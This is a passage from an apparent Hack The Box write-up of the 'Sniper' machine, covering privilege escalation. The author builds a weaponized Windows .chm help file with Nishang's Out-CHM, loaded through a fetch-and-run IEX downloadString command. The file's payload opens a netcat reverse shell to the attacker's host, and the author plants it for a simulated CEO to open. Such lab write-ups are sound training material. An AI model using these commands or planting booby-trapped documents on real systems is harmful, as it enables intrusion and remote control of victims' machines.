Sniper CEO.</p></blockquote><p>The CEO wants a app documentation and is waiting to chris to drop it inside the Docs directory.</p><p>If we return to chris folder there is a interesting file at downloads directory.</p><p><img alt=Untitled loading=lazy src=/HTB/sniper-21.png></p><p>It’s a .chm file which is Windows help files, so that could be the documentation that the CEO was talking about.</p><p><img alt=Untitled loading=lazy src=/HTB/sniper-24.webp></p><p>We know now that the CEO is waiting .chm file so let’s put a weaponized one in the docs directory.</p><p>I have used a Windows VM for this part as it’s necessary for the use of HTML Help Workshop which is a Windows program which help us to create .chm files.</p><p>First we need to install Out-CHM a <a href=https://github.com/samratashok/nishang/tree/master>NisHang</a> tool which makes weaponized .chm with the help of HTML Help Workshop.</p><p>Once in the powershell we can import the script with:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>IEX</span><span class=p>(</span><span class=nb>New-Object</span> <span class=n>Net</span><span class=p>.</span><span class=n>WebClient</span><span class=p>).</span><span class=py>downloadString</span><span class=p>(</span><span class=s2>&#34;https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>The use of Out-CHM is very simple we need to pass the Payload which are going to execute in the remote machine and the path of the HTML Help Workshop (If you don’t have it you can install it from <a href=http://web.archive.org/web/20160201063255/http://download.microsoft.com/download/0/A/9/0A939EF6-E31C-430F-A3DF-DFAE7960D564/htmlhelp.exe>here</a>).</p><p>We are going to use the following payload to establish a reverse shell with the victim</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Out-CHM</span> <span class=n>-Payload</span> <span class=s2>&#34;\Docs\nc.exe -e cmd 10.10.14.20 4443&#34;</span> <span class=n>-HHCPath</span> <span class=s2>&#34;C:\Program Files (x86)\HTML Help Workshop&#34;</span>
</span></span></code></pre></div><p>Now we have a weaponoized .chm named doc.chm in our VM, only lefts to put it in the Docs directory of the remote machine. I moved first the file to my smb share and performed the next command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>copy </span><span class=p>\\</span><span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=mf>20</span><span class=p>\</span><span class=n>smbFolder</span><span class=p>\</span><span class=n>doc</span><span class=p>.</span><span class=py>chm</span> <span class=n>C:</span><span class=p>\</span><span class=n>Docs</span>
</span></span></code></pre></div><p>We need to copy the nc.exe binary from or samba share to the remote machine to make sure it works.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>copy </span><span class=p>\\</span><span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=mf>20</span><span class=p>\</span><span class=n>smbFolder</span><span class=p>\</span><span class=n>nc</span><span class=p>.</span><span class=py>exe</span> <span class=n>C:</span><span class=p>\</span><span class=n>Docs</span>
</span></span></code></pre></div><p>Only rest put a listener and wait to the CEO to open my malicious file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>nc</span> <span class=n>-lv</span> <span class=mf>4443</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/HTB/sniper-22.png></p><p>We have owned the system, let’s cat the <strong>root’s flag.</strong></p><p><img alt=Untitled loading=lazy src=/HTB/sniper-23.png></p><h2 id=lessons-learned>Lessons Learned<a hidden class=anchor aria-hidden=true href=#lessons-learned>#</a></h2><ul><li><p>What insights did you gain from the room?</p><p>I learned how I can perform a smb RFI attack to gain RCE in a windows machine and to create weaponized .chm to perform a privesc.</p></li><li><p>Were there any novel tools or techniques employed?</p><p>I discovered a new technique called user pivoting which helps you to invoke commands with the user credentials.</p></li></ul><p><strong>Thank you for reading, and happy hacking! 😄</strong></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://pwndside.github.io/tags/windows/>Windows</a></li><li><a href=https://pwndside.github.io/tags/web/>Web</a></li><li><a href=https://pwndside.github.io/tags/privesc/>Privesc</a></li><li><a href=https://pwndside.github.io/tags/smb/>Smb</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://pwndside.github.io/>PwndSide</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>